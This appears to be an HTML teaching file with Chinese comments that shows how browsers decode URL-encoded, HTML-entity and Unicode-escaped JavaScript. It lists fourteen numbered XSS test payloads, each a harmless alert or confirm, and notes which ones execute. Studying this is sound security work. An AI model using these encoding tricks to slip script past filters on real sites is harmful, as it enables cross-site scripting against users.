<body>
<a href="%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29"></a>
<!--URL 编码 "javascript:alert(1)"-->

<a href="&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:%61%6c%65%72%74%28%32%29">
<!--HTML字符实体编码 "javascript" 和 URL 编码 "alert(2)"-->

<a href="javascript%3aalert(3)"></a>
<!--URL 编码 ":"-->

<div>&#60;img src=x onerror=alert(4)&#62;</div>
<!--HTML字符实体编码 < 和 >-->

<textarea>&#60;script&#62;alert(5)&#60;/script&#62;</textarea>
<!--HTML字符实体编码 < 和 >-->

<textarea><script>alert(6)</script></textarea>

<button onclick="confirm('7&#39;);">Button</button>
<!--HTML字符实体编码 " ' " （单引号）-->

<button onclick="confirm('8\u0027);">Button</button>
<!--Unicode编码 " ' " （单引号）-->

<script>&#97;&#108;&#101;&#114;&#116;&#40;&#57;&#41;&#59</script>
<!--HTML字符实体编码 alert(9);
script块有个有趣的属性：在块中的字符引用并不会被解析和解码-->

<script>\u0061\u006c\u0065\u0072\u0074(10);</script>
<!--Unicode 编码 alert-->

<script>\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0031\u0029</script>
<!--Unicode 编码 alert(11)-->

<script>\u0061\u006c\u0065\u0072\u0074(\u0031\u0032)</script>
<!--Unicode 编码 alert 和 12
不会被正确执行要么是因为'\u0031\u0032'不会被解释为字符串常量（因为它们没有用引号闭合）要么是因为它们是ASCII型数字。-->

<script>\u0061\u006c\u0065\u0072\u0074('\u0031\u0032')</script>
<!--Unicode 编码 alert 和 12
加了引号可以执行-->

<script>alert('13\u0027)</script>
<!--Unicode 编码 " ' " （单引号）
不会执行的原因是'\u0027'仅仅会被解释成单引号文本，而此时字符串是未闭合的。
Unicode转义控制字符时，例如单引号、双引号、圆括号等等，它们将不会被解释成控制字符，而仅仅被解码并解析为标识符名称或者字符串常量。如果解析器正在解析一个函数调用语句，圆括号部分必须为“(”和“)”，而不能是\u0028和\u0029。总的来说，Unicode转义序列只有在标识符名称里不被当作字符串，也只有在标识符名称里的编码字符能够被正常的解析。-->

<script>alert('14\u000a')</script>
<!--Unicode 编码换行符（0x0A）
能够执行的原因是'\u000a'会被解释成换行符文本，这并不会导致真正的换行从而引发JavaScript语法错误。-->
